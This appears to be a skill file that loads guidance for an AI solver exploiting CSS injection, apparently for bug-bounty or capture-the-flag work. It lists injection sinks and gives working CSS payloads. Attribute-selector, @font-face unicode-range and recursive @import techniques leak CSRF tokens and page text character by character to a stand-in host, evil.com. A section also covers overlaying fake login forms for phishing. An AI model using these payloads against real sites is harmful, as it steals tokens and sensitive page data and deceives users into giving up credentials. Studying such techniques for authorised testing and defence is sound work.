---
name: css-injection
description: "CSS injection exploitation for data exfiltration and UI redress. Load when a solver finds user input flowing into style attributes, style tags, or CSS custom properties."
---

# CSS Injection Skill

## Sinks
- `element.style.cssText = userInput`
- `element.setAttribute('style', userInput)`
- `<style>` tag content from user input
- CSS custom property values: `element.style.setProperty('--var', userInput)`
- `document.styleSheets[n].insertRule(userInput)`
- Inline style injection via HTML injection: `<div style="INJECTION">`

## CSS injection is NOT XSS
Modern browsers do not execute JavaScript from CSS. `expression()` is IE-only and dead. `javascript:` in `url()` doesn't work. Focus on: **data exfiltration** and **UI manipulation**.

## Data exfiltration techniques

### Attribute selector exfiltration (CSRF token theft)
Leak sensitive attribute values character by character:
```css
input[name="csrf"][value^="a"] { background: url(https://evil.com/?t=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/?t=b); }
/* ... for each character ... */
```
Requires: CSS injection + sensitive value in HTML attribute + CSP allows external URLs (or use `@import` for some CSPs).

### Sequential exfiltration (full token recovery)
After leaking first char `a`:
```css
input[name="csrf"][value^="a0"] { background: url(https://evil.com/?t=a0); }
input[name="csrf"][value^="a1"] { background: url(https://evil.com/?t=a1); }
```
Repeat per character. Automatable with server-side script that generates next CSS payload.

### @font-face unicode-range exfiltration
Load different fonts for different characters from unique URLs:
```css
@font-face { font-family: x; src: url(https://evil.com/?c=a); unicode-range: U+0061; }
@font-face { font-family: x; src: url(https://evil.com/?c=b); unicode-range: U+0062; }
/* Apply font to target element */
.secret { font-family: x; }
```
Server sees which character URLs are requested → reveals text content.

### @import recursive injection
If you can inject `@import url(https://evil.com/steal.css)`, your server can dynamically generate CSS based on previously leaked chars, enabling automated sequential exfiltration.

## UI redress / phishing via CSS
- `position: fixed/absolute` to overlay fake login forms
- `display: none` on legitimate elements, show attacker content
- `content: url(evil)` on `::before`/`::after` pseudo-elements
- `opacity: 0` on real buttons, overlay fake buttons at same position
- Resize and reposition elements to confuse users

## PortSwigger research connections
- CSS-based timing attacks abusing jQuery (from PortSwigger XSS research page)
- PortSwigger Top 10 2025: Syntax confusion research includes CSS parsing differentials

## Bug bounty severity
| Impact | Severity |
|--------|----------|
| CSRF token exfiltration → CSRF chain | **Medium-High** |
| Sensitive data exfiltration from DOM | **Medium** |
| Credential phishing via UI overlay | **Medium** |
| Cosmetic manipulation only | **Informative** |
| CSS injection without data exfil path | **Informative** |

## Key references
- PortSwigger CSS injection: context-specific within XSS cheat sheet
- PayloadsAllTheThings CSS Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/XSS%20in%20CSS/
